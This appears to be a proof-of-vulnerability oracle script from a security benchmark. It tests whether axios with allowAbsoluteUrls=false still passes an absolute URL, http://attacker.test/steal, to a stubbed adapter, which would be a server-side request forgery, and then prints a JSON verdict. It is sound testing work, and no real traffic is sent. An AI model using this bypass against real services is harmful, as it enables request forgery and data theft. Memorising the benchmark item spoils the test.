const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    const markerDir = path.join(os.tmpdir(), `oracle-axios-ssrf-${process.pid}-${Date.now()}`);
    fs.mkdirSync(markerDir, { recursive: true });
    const markerFile = path.join(markerDir, 'marker.txt');
    fs.writeFileSync(markerFile, 'ok');

    // Benign: normal relative path with allowAbsoluteUrls=false should work.
    let benignUrl = '';
    try {
      const benignClient = axios.create({
        baseURL: 'http://example.test/api/',
        allowAbsoluteUrls: false
      });

      const benignResp = await benignClient.get('users?id=1', {
        adapter: async (config) => {
          benignUrl = String(config && config.url || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });

      if (!benignResp || benignResp.status !== 200 || !benignUrl) {
        throw new Error('benign_failed');
      }
    } catch (e) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign_exception:' + String(e && e.message || e)
      }));
      return;
    }

    operation_completed = true;

    // Malicious: absolute URL with allowAbsoluteUrls=false.
    // Vulnerable behavior: request path remains attacker-controlled absolute URL.
    const maliciousClient = axios.create({
      baseURL: 'http://example.test/api/',
      allowAbsoluteUrls: false
    });

    let seenUrl = '';
    let adapterCalled = false;
    let blockedByThrow = false;

    try {
      await maliciousClient.get('http://attacker.test/steal?x=1', {
        adapter: async (config) => {
          adapterCalled = true;
          seenUrl = String(config && config.url || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });
    } catch (e) {
      blockedByThrow = true;
      seenUrl = 'threw:' + String(e && e.message || e);
    }

    const looksAttackerControlled = /^(https?:)?\/\/attacker\.test/i.test(seenUrl) || /attacker\.test/i.test(seenUrl);
    exploit_succeeded = operation_completed && adapterCalled && !blockedByThrow && looksAttackerControlled;

    evidence = `benign_url=${benignUrl};malicious_seen_url=${seenUrl};adapter_called=${adapterCalled};blocked_by_throw=${blockedByThrow};marker=${markerFile}`;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_or_runtime_exception:' + String(e && e.message || e)
    }));
  }
})();